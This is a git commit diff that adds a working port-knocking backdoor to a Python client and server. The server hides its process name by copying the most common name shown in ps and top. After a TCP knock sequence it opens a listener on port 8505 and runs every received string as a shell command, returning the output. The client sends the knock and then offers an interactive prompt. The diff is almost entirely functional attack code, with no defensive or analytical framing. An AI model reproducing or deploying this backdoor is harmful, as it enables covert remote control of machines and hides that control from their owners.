5cb35a9b930620434c70a95d2f64b492b0db0622
Brij Shah <brijshah0@gmail.com>
2015-10-10 14:36:49 -0700

    port knocking finished, added ability to create connection between client server with backdoor. still not 100%. Needs encryption.

--- client.py
+++ client.py
@@ -1,21 +1,15 @@
 #!/usr/bin/python
 
-import sys
-import os
-import argparse
-import base64
-import shlex
-import socket
-import logging
+import sys, os, argparse, socket, logging
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
+from Crypto.Cipher import AES
 
 parser = argparse.ArgumentParser(description='Backdoor Client')
 parser.add_argument('-d', '--destination', dest='destIp', help='destination IP Address')
 parser.add_argument('-p', '--ports', dest='ports', help='port sequence', nargs='+', type=str, required=True)
 parser.add_argument('-c', '--command', dest='cmd', help='command to send', type=str)
 args = parser.parse_args()
-
 
 def knock(host, ports):
 	host = args.destIp
@@ -28,8 +22,17 @@ def knock(host, ports):
 
 def main():
 	knock(args.destIp, args.ports)
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.connect((args.destIp, 8505))
 
-main()
-# def sendCommand(ipAddr):
-# 	data = shlex.split(args.cmd) #do this on sever
-# 	pkt = IP(dst=ipAddr)/TCP(sport=RandNum(0, 65335), dport=RandNum(0, 65355))/data
+	while 1:
+		command = raw_input('Enter command: ')
+		s.sendall(command)
+		data = s.recv(1024)
+		print data
+
+if __name__ == '__main__':
+	try:
+		main()
+	except KeyboardInterrupt:
+		print 'Exiting..'
--- server 2.py
+++ server 2.py
@@ -1,23 +1,57 @@
 #!/usr/bin/python
 
-import sys
-import os
-import argparse
-import socket
-import logging
+import sys, os, argparse, socket, subprocess, setproctitle, logging
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
+from Crypto.Cipher import AES
 
 knock = [2000,2001,2002]
 count = 0
+conn = ''
+addr = ''
+
+def setProcessName(name):
+    from ctypes import cdll, byref, create_string_buffer
+    libc = cdll.LoadLibrary('libc.so.6')
+    buff = create_string_buffer(len(name) + 1)
+    buff.value = name
+    libc.prctl(15, byref(buff), 0, 0, 0)
+
+def maskProcess():
+    # Gets the most common process name for ps -aux/htop
+    command = os.popen("ps -aux | awk '{ print $11 }' | sort | uniq -c | sort -n | tail -n1 | awk '{ print $2}'")
+    commandResult = command.read()
+    print "The most common process for ps/htop is: {0}".format(commandResult)
+
+    # Masks the process for ps -aux and htop.
+    setproctitle.setproctitle(commandResult)
+
+    # Gets the most common process name from top
+    command = os.popen("top -bn1 | awk '{ print $12 }' | sort | uniq -c | sort -n | tail -n1 | awk '{ print $2}'")
+    commandResult = command.read()
+
+    # Masks the process for top
+    setProcessName(commandResult)
+    print "The most common process for top is: {0}".format(commandResult)
 
 def createServer(host, port):
+	global conn
+	global addr
 	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	serverAddr = (host, port)
-	sock.bind(serverAddr)
+	try:
+		sock.bind(serverAddr)
+	except socket.error as msg:
+		sys.exit()
+
+	sock.listen(10)
+	conn,addr = sock.accept()
 
 def remoteExecute(pkt):
+	global conn
+	global addr
 	global count
+	dstIP = pkt[1].dst
 	wnd = pkt[2].window
 	if wnd == 4096:
 		port = pkt[2].sport
@@ -28,11 +62,24 @@ def remoteExecute(pkt):
 		if port == knock[2]:
 			count +=1
 		if count == 3:
-			#do shit here
+			print 'Authenticated!..Establishing Connection..'
+			createServer(dstIP, 8505)
 	elif count < 3:
 		return
 
 def main():
-	sniff(filter="ip and tcp", prn=remoteExecute)
+	global conn
+	global addr
+	maskProcess()
+	sniff(count= 5, filter="ip and tcp", prn=remoteExecute)
+	while 1:
+		data = conn.recv(1024)
+		process = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+		output = process.stdout.read() + process.stderr.read()
+		conn.sendall(output)
 
-main()
+if __name__ == '__main__':
+	try:
+		main()
+	except KeyboardInterrupt, AttributeError:
+		print 'Exiting..'
